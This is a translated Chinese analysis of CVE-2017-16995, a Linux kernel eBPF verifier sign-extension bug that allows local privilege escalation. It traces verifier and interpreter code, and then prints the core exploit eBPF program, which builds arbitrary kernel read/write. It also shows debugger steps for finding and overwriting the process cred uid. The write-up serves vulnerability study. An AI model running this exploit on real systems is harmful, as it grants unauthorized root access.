# CVE-2017-16995 eBPF 整数扩展问题导致本地提权漏洞分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
漏洞是由于ebpf模块的整数扩展问题导致可以一段指令绕过verifier的检测，进而向内核注入任意的执行代码，导致本地提权。这里就不在介绍ebpf的基础知识了，网上资料很多，可以学习一波。
## 漏洞分析
先看一下poc
    1.BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */
    2.BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) {        */
    3.BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */
    4.BPF_EXIT_INSN()
    5.……
由于verifier中对jmp和mov的检测与执行时候的语义不同导致我们可以将5指令之后的一系列指令绕过verifier的检测。
###  verifier检查时
我们具体来看一下。首先检测的是mov32这条指令。由于MOV32_IMM指令属于ALU这个class进入如下的分支。
    static int do_check(struct bpf_verifier_env *env)
    {
      //...
      if (class == BPF_ALU || class == BPF_ALU64) {
                err = check_alu_op(env, insn);
                if (err)
                    return err;
            }
      //...
    }
接着进入checl_alu_op函数中的如下分支，由于第一条指令我们是立即数因此这里的BPF_SRC(insn->code) == BPF_K
    static int check_alu_op(struct verifier_env *env, struct bpf_insn *insn)
    {
      //...
      else if (opcode == BPF_MOV) {
        if (BPF_SRC(insn->code) == BPF_X) {
          //...
        } else {
          if (insn->src_reg != BPF_REG_0 || insn->off != 0) {
            verbose("BPF_MOV uses reserved fields\n");
            return -EINVAL;
          }
        }
        /* check dest operand */
        //此时寄存器是作为目的操作数，这里进行一些检查，如目的寄存器不能是fp也就是reg10，并且将目的寄存器的type标记为unknown
        err = check_reg_arg(regs, insn->dst_reg, DST_OP);
        if (err)
          return err;
        if (BPF_SRC(insn->code) == BPF_X) {
          //...
        } else {
          /* case: R = imm
                 * remember the value we stored into this reg
                 */
          //最终会执行到这里
          regs[insn->dst_reg].type = CONST_IMM;
          regs[insn->dst_reg].imm = insn->imm;
        }
      }
      //...
    }
最终也就是会执行
    regs[insn->dst_reg].type = CONST_IMM;
    regs[insn->dst_reg].imm = insn->imm;
将目的寄存器的type设置为IMM，将imm成员变量设置为0xffffffff。其中`regs`的结构体定义如下，用来表示一个寄存器的状态。可以看到这里的imm也是int类型与insn中的imm类型相同。
    struct reg_state {
      enum bpf_reg_type type;
      union {
        /* valid when type == CONST_IMM | PTR_TO_STACK */
        int imm;
        /* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |
             *   PTR_TO_MAP_VALUE_OR_NULL
             */
        struct bpf_map *map_ptr;
      };
    };
那么当执行到第二条指令也就是`BPF_JMP_IMM`的时候，就会进入如下的分支
    static int do_check(struct bpf_verifier_env *env)
    {
      //...
      else if (class == BPF_JMP) {
        u8 opcode = BPF_OP(insn->code);
        //...
         else {
           //处理条件跳转
          err = check_cond_jmp_op(env, insn, &insn_idx);
          if (err)
            return err;
        }
      }
      //...
    }
接着会进入到check_cond_jmp_op函数的如下分支
    static int check_cond_jmp_op(struct verifier_env *env,
                     struct bpf_insn *insn, int *insn_idx)
    {
      //...
      if (BPF_SRC(insn->code) == BPF_X) {
            //...
        } else {
            if (insn->src_reg != BPF_REG_0) {
                verbose("BPF_JMP uses reserved fields\n");
                return -EINVAL;
            }
        }
      err = check_reg_arg(regs, insn->dst_reg, SRC_OP);
        if (err)
            return err;
      if (BPF_SRC(insn->code) == BPF_K &&
            (opcode == BPF_JEQ || opcode == BPF_JNE) &&
            regs[insn->dst_reg].type == CONST_IMM &&
            regs[insn->dst_reg].imm == insn->imm) {
            if (opcode == BPF_JEQ) {
                /* if (imm == imm) goto pc+off;
                 * only follow the goto, ignore fall-through
                 */
                *insn_idx += insn->off;
                return 0;
            } else {
                /* if (imm != imm) goto pc+off;
                 * only follow fall-through branch, since
                 * that's where the program will go
                 */
          // 这里直接返回
                return 0;
            }
        }
      //...
    }
可以看到处理的逻辑，这里判断了regs[insn->dst_reg].imm ==
insn->imm，由于这两个结构体中的imm类型均相同都为int，因此这里的条件判读恒成立，直接返回。不会在进行后续的push_stack等增加分支以进行遍历检查的操作。
我们看一下exit的检查分支
    static int do_check(struct bpf_verifier_env *env)
    {
      //...
      else if (class == BPF_JMP) {
        u8 opcode = BPF_OP(insn->code);
        //...
        else if (opcode == BPF_EXIT) {
          if (BPF_SRC(insn->code) != BPF_K ||
              insn->imm != 0 ||
              insn->src_reg != BPF_REG_0 ||
              insn->dst_reg != BPF_REG_0) {
            verbose("BPF_EXIT uses reserved fields\n");
            return -EINVAL;
          }
          /* eBPF calling convetion is such that R0 is used
                     * to return the value from eBPF program.
                     * Make sure that it's readable at this time
                     * of bpf_exit, which means that program wrote
                     * something into it earlier
                     */
          err = check_reg_arg(regs, BPF_REG_0, SRC_OP);
          if (err)
            return err;
          if (is_pointer_value(env, BPF_REG_0)) {
            verbose("R0 leaks addr as return value\n");
            return -EACCES;
          }
          process_bpf_exit:
          insn_idx = pop_stack(env, &prev_insn_idx);// 如果有其他分支的话遍历检查
          if (insn_idx dst_reg]
    #define IMM    insn->imm
    ALU_MOV_K:
      DST = (u32) IMM;
      CONT;
但是注意到这里的regs与verifier中的regs并不相同，此时的regs是__bpf_prog_run函数中的局部变量
    u64 regs[MAX_BPF_REG], tmp;
注意到这里时u64类型的。而在赋值的过程中将imm强制类型转换为了u32类型。
    JMP_JNE_K:
      if (DST != IMM) {
        insn += insn->off;
        CONT_JMP;
      }
      CONT;
这里的IMM也就是insn->imm的类型没变，还是int类型，也就是下面结构体中的__s32类型。
    struct bpf_insn {
        __u8    code;        /* opcode */
        __u8    dst_reg:4;    /* dest register */
        __u8    src_reg:4;    /* source register */
        __s16    off;        /* signed offset */
        __s32    imm;        /* signed immediate constant */
    };
因此这里两者类型冲突判断不成立，也就是这里总是会发生跳转。就绕过了exit从第5条指令开始执行。那么注意到的是第5条指令之后都是未经过verifier验证的指令。
因此这里我们可以向kernel中注入任意的指令。
## 漏洞利用
已经可以向kernel中注入任意的指令，那么我们这里就可以做到任意内存读取了。关键部分的ebpf程序在这
    BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),           /* r9 = (u32)0xFFFFFFFF   */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2), /* if (r9 == -1) {        */
    BPF_MOV64_IMM(BPF_REG_0, 0),                    /*   exit(0);             */
    BPF_EXIT_INSN(),
    BPF_GET_MAP(ctrl_mapfd, 0),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg6 = opcode
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 8),    // reg7 = index/address
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0x10), // reg8 = value
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),             // save map address to reg9
    // opcode = 0, read map + index
    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7), // r0 += r7
    // read
    BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 4),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = *r0
    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_6, 0), // *r9 = r6 save res to map[0]
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    //write opcode = 1
    BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3),
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0), // *r0 = r8
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    // opcode = 2 get reg10 value
    BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 2, 4),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_10),         // reg1 = reg10
    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_6, 0), // *reg9 = reg10
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    // opcode = 3 ab read
    BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 3, 4),        // opcode =3 ab read reg7 address
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, 0), // reg6 = *r7
    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_6, 0), // *reg9 = reg6
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    //opcode = 4 ab write
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // *reg7 = reg8
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
代码应该很容易理解，这里就不解释了
这里利用存在两种方式
###  覆写cred
由于我们可以任意注入指令，因此这里我们可以直接拿到reg10也就是内核栈地址了。
    current = stack_address & ~(0x4000 - 1)
current偏移为0的位置指向的就是current_task的地址，也就是当前进程的struct
task结构。从这个结构中我们能拿到cred的地址，之后覆写uid就可了。
    pwndbg> p/x 0xffff88001dbc3cc0 & ~(0x4000 - 1) // reg10, kernel stack
    $4 = 0xffff88001dbc0000
    pwndbg> x/2gx 0xffff88001dbc0000// current
    0xffff88001dbc0000:     0xffff88001db2d080      0x0000000000000000
    pwndbg> p ((struct task_struct *)0xffff88001db2d080)->cred
    $5 = (const struct cred *) 0xffff88001db41a80
    pwndbg> p *((struct task_struct *)0xffff88001db2d080)->cred
    $6 = {
      usage = {
        counter = 9
      },
      uid = {
        val = 1000
      },
      gid = {
        val = 1000
      },
      suid = {
        val = 1000
      }
不同系统的task中cred的偏移不同，因此这里可以用爆破即首先通过prctl设置name，然后直接爆破搜索即可。但是这样是有点麻烦的。因为我们已经知道了task的地址，而cred距离task不远，因此这里我们直接搜索uid/gid也就是可以的。